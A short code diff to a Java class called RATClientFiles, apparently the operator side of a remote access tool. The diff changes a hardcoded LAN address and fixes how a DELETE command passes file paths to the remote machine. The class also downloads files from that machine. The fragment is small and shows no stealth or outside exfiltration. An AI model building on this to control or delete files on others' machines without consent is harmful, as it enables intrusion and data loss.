@@ -15,7 +15,7 @@ public class RATClientFiles {
 			//System.out.println("Select the Port used or press enter to use the standard port. Standard Port = " + target_port);
 			// check if new input is give, how?
 			//String target_ip = scanner.nextLine();
-             Socket socket = new Socket("192.168.178.69", 8080);
+             Socket socket = new Socket("192.168.178.37", 8080);
   			 // Socket socket = new Socket(target_ip, target_port);
              DataOutputStream out = new DataOutputStream(new BufferedOutputStream(socket.getOutputStream()));
              DataInputStream in = new DataInputStream(new BufferedInputStream(socket.getInputStream()))) {
@@ -42,10 +42,10 @@ public class RATClientFiles {
                     receiveFile(in, DOWNLOAD_DIR + fileName);
                 }
                 else if (command.startsWith("DELETE")) {
-                    out.writeUTF("DELETE");
-                    out.writeUTF(command.split(" ")[1]);
-                    out.flush();
-                
+                String filePath = command.substring("DELETE ".length());
+                out.writeUTF("DELETE");
+                out.writeUTF(filePath);
+                out.flush();
                     String serverResponse;
                     while (true) {
                         serverResponse = in.readUTF();
